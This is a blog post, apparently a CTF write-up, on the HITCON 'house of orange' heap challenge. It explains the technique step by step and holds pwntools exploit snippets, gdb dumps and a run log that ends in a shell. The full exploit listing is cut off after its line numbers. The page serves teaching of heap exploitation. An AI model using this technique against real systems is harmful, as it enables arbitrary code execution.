<!DOCTYPE html>




<html class="theme-next muse" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="pwn,ctf,">





  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">






<meta name="description" content="题目链接：https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange 讲解题目这是一个HITCON中的经典题目了，通过对buildhouse函数的逆向可以得到下面两个结构体 123456789struct house&amp;#123;    struct orange* point;    qword*  name;&amp;#1">
<meta name="keywords" content="pwn,ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF PWN之house of orange">
<meta property="og:url" content="https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/index.html">
<meta property="og:site_name" content="giantbranch&#39;s blog">
<meta property="og:description" content="题目链接：https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange 讲解题目这是一个HITCON中的经典题目了，通过对buildhouse函数的逆向可以得到下面两个结构体 123456789struct house&amp;#123;    struct orange* point;    qword*  name;&amp;#1">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://pic.giantbranch.cn/pic/1546401871330.jpg">
<meta property="og:updated_time" content="2023-10-13T13:14:33.050Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF PWN之house of orange">
<meta name="twitter:description" content="题目链接：https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange 讲解题目这是一个HITCON中的经典题目了，通过对buildhouse函数的逆向可以得到下面两个结构体 123456789struct house&amp;#123;    struct orange* point;    qword*  name;&amp;#1">
<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1546401871330.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/">





  <title>CTF PWN之house of orange | giantbranch's blog</title>
  





<script async src="https://www.googletagmanager.com/gtag/js?id=G-SQ8CHXJB60"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-SQ8CHXJB60');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">giantbranch's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-vulfound">
          <a href="/vulfound/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
            
            漏洞挖掘
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
            
            读过的书
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="giantbranch">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="giantbranch's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">CTF PWN之house of orange</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-29T00:00:00+00:00">
                2018-12-29
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/12/29/CTF PWN之house of orange/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/12/29/CTF PWN之house of orange/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>题目链接：<a href="https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange" target="_blank" rel="noopener">https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange</a></p>
<h1 id="讲解题目"><a href="#讲解题目" class="headerlink" title="讲解题目"></a>讲解题目</h1><p>这是一个HITCON中的经典题目了，通过对buildhouse函数的逆向可以得到下面两个结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct house&#123;</span><br><span class="line">    struct orange* point;</span><br><span class="line">    qword*  name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct orange&#123;</span><br><span class="line">    dword   price</span><br><span class="line">    dword   color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以在ida新建结构体，当然这题好像没啥太大的帮助</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000 orange          struc ; (sizeof=0x8, mappedto_6)</span><br><span class="line">00000000                                         ; XREF: house/r</span><br><span class="line">00000000 price           dd ?</span><br><span class="line">00000004 color           dd ?</span><br><span class="line">00000008 orange          ends</span><br><span class="line">00000008</span><br><span class="line">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 house           struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 orangePoint     orange ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 house           ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure>

<p>保护是全开的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>总体思路：</p>
<p>1、通过upgrade的溢出覆盖topchunk size，那么我们再build，原来的topchunk就到unsortbin去了，就有了libc指针</p>
<p>注意：topchunk size的覆盖是有限制的，最低位要是1，跟topchunk的其实地址加起来要跟0x1000对齐，还有要大于MINSIZE （好像是0x10）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">######### overwrite top chunk size</span><br><span class="line">build(0x10, &quot;A&quot;*0x10, 10,  1)</span><br><span class="line">upgrade(0x40, &quot;A&quot;*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)</span><br><span class="line"># let top chunk to unsort bin list</span><br><span class="line">build(0xfb0, &quot;A&quot;*0x10, 10,  1)</span><br></pre></td></tr></table></figure>

<p>2、接下来我们申请一个largebin大小的（因为有fd_nextsize和bk_nextsize，可以泄露heap的地址），我们只覆盖前8个字节就可以leak出libc了</p>
<p>注：64位下，largebin最小大小是0x400，即1024字节，要申请largebin大小，必须大于等于0x3e9</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">######### leak libc</span><br><span class="line"># in 64 bit, must malloc more than 0x3e9 to get large bin</span><br><span class="line">build(0x400, &quot;A&quot;*8, 10,  1)</span><br><span class="line"># build(0x3e9, &quot;A&quot;*8, 10,  1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&quot;Name of house : AAAAAAAA&quot;)</span><br><span class="line">largebin_leak = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;largebin_leak = &quot; + hex(largebin_leak)</span><br><span class="line">main_arena = largebin_leak - 1640</span><br><span class="line">print &quot;main_arena = &quot; + hex(main_arena)</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print &quot;libc_base = &quot; + hex(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">_IO_list_all = libc_base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">print &quot;system = &quot; + hex(system)</span><br><span class="line">print &quot;_IO_list_all = &quot; + hex(_IO_list_all)</span><br></pre></td></tr></table></figure>

<p>3、之后再覆盖0x10大小，泄露heap地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># leak heap</span><br><span class="line">upgrade(0x20, &quot;A&quot;*0x10, 10 , 1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&quot;Name of house : AAAAAAAAAAAAAAAA&quot;)</span><br><span class="line">heap_addr = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;heap_addr = &quot; + hex(heap_addr)</span><br></pre></td></tr></table></figure>

<p>4、最后就利用溢出覆盖unsortbin的bk，实行unsortbin attack，将<code>_IO_list_all</code>指针指向了<code>main_arena+0x58</code>，那么链表指针<code>_chain</code>指向了smallbin[4]，即第5个smallbin——0x60大小的。而我们之前就将unsortbin的size改为0x61，所以我们再申请的时候，他首先就会放到smallbin[4],最后我们伪造vtable即可</p>
<p><img src="http://pic.giantbranch.cn/pic/1546401871330.jpg" alt></p>
<p>查看unsortbin位置，可以看到确实chain指向</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *((struct _IO_FILE_plus*)0x7f742fb8db78)</span><br><span class="line">$13 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xf12befc0, </span><br><span class="line">    _IO_read_ptr = 0x559af129d4f0 &quot;&quot;, </span><br><span class="line">    _IO_read_end = 0x559af129d4f0 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7f742fb8e510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, </span><br><span class="line">    _IO_write_end = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, </span><br><span class="line">    _IO_save_base = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, </span><br><span class="line">    _IO_backup_base = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, </span><br><span class="line">    _IO_save_end = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, </span><br><span class="line">    _markers = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _chain = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _fileno = 0x2fb8dbd8, </span><br><span class="line">    _flags2 = 0x7f74, </span><br><span class="line">    _old_offset = 0x7f742fb8dbd8, </span><br><span class="line">    _cur_column = 0xdbe8, </span><br><span class="line">    _vtable_offset = 0xb8, </span><br><span class="line">    _shortbuf = &quot;/&quot;, </span><br><span class="line">    _lock = 0x7f742fb8dbe8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 0x7f742fb8dbf8, </span><br><span class="line">    _codecvt = 0x7f742fb8dbf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7f742fb8dc08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7f742fb8dc08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7f742fb8dc18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 0x7f742fb8dc18, </span><br><span class="line">    _mode = 0x2fb8dc28, </span><br><span class="line">    _unused2 = &quot;t\177\000\000(?/t\177\000\000\070?/t&quot;...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f742fb8dc38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么整个过程怎么触发的呢？</p>
<p>我们修改了bk后，那当我们再次申请内存的时候，其他bins都没有可用的，而unsortbin有可用的内存，就会遍历unsortbin列表，不合适就将bin拖链放到对应的bins列表，比如0x60大小的就放到smallbin那里了，这时候就通过unsortbin attack修改了<code>_IO_list_all</code>，即下面代码的<code>bck-&gt;fd = unsorted_chunks (av);</code>，将unsortbin的头指针写到了bck的fd，即我们要写到<code>(_IO_list_all-0x10)-&gt;fd</code>，也即写到<code>_IO_list_all</code>（注：av的类型是malloc_state，即mstate，他指向main_arena），再次遍历下一个时由于size为0即<code>_IO_list_all-8</code>处为0，触发的异常，从而劫持控制力，详细请看附录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, 0))</span><br><span class="line">            malloc_printerr (&quot;malloc(): memory corruption&quot;);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">		 	.............</span><br><span class="line">			.............</span><br><span class="line">			.............</span><br><span class="line">		  /* remove from unsorted list */</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">			.............</span><br><span class="line">			.............</span><br><span class="line">			.............</span><br></pre></td></tr></table></figure>

<p>还有我们伪造的IO_FILE需要满足一些条件，才能调用<code>_IO_OVERFLOW</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>

<p>那么<code>_IO_OVERFLOW</code>指针覆盖为system，fp头指针我们设置为<code>/bin/sh</code></p>
<p>最终即可成功getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting local process &apos;./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&apos;: pid 6012</span><br><span class="line">[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">largebin_leak = 0x7fbfa9142188</span><br><span class="line">main_arena = 0x7fbfa9141b20</span><br><span class="line">libc_base = 0x7fbfa8d7d000</span><br><span class="line">system = 0x7fbfa8dc2390</span><br><span class="line">_IO_list_all = 0x7fbfa9142520</span><br><span class="line">heap_addr = 0x55dab4acf0c0</span><br><span class="line">0x520</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">*** Error in `./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&apos;: malloc(): memory corruption: 0x00007fbfa9142520 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbfa8df47e5]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7fbfa8dff13e]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7fbfa8e01184]</span><br><span class="line">./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682(+0xd6d)[0x55dab2fc4d6d]</span><br><span class="line">./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682(+0x1402)[0x55dab2fc5402]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbfa8d9d830]</span><br><span class="line">./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682(+0xb19)[0x55dab2fc4b19]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">55dab2fc4000-55dab2fc7000 r-xp 00000000 08:01 402634                     /home/giantbranch/ctf2018/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682</span><br><span class="line">55dab31c6000-55dab31c7000 r--p 00002000 08:01 402634                     /home/giantbranch/ctf2018/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682</span><br><span class="line">55dab31c7000-55dab31c8000 rw-p 00003000 08:01 402634                     /home/giantbranch/ctf2018/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682</span><br><span class="line">55dab4acf000-55dab4b12000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fbfa4000000-7fbfa4021000 rw-p 00000000 00:00 0 </span><br><span class="line">7fbfa4021000-7fbfa8000000 ---p 00000000 00:00 0 </span><br><span class="line">7fbfa8b67000-7fbfa8b7d000 r-xp 00000000 08:01 2626521                    /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7fbfa8b7d000-7fbfa8d7c000 ---p 00016000 08:01 2626521                    /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7fbfa8d7c000-7fbfa8d7d000 rw-p 00015000 08:01 2626521                    /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7fbfa8d7d000-7fbfa8f3d000 r-xp 00000000 08:01 2626483                    /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7fbfa8f3d000-7fbfa913d000 ---p 001c0000 08:01 2626483                    /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7fbfa913d000-7fbfa9141000 r--p 001c0000 08:01 2626483                    /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7fbfa9141000-7fbfa9143000 rw-p 001c4000 08:01 2626483                    /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7fbfa9143000-7fbfa9147000 rw-p 00000000 00:00 0 </span><br><span class="line">7fbfa9147000-7fbfa916d000 r-xp 00000000 08:01 2626455                    /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7fbfa9351000-7fbfa9354000 rw-p 00000000 00:00 0 </span><br><span class="line">7fbfa936b000-7fbfa936c000 rw-p 00000000 00:00 0 </span><br><span class="line">7fbfa936c000-7fbfa936d000 r--p 00025000 08:01 2626455                    /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7fbfa936d000-7fbfa936e000 rw-p 00026000 08:01 2626455                    /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7fbfa936e000-7fbfa936f000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffc73a63000-7ffc73a84000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffc73b8c000-7ffc73b8f000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffc73b8f000-7ffc73b91000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">$ id</span><br><span class="line">uid=1000(giantbranch) gid=1000(giantbranch) groups=1000(giantbranch)</span><br></pre></td></tr></table></figure>

<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 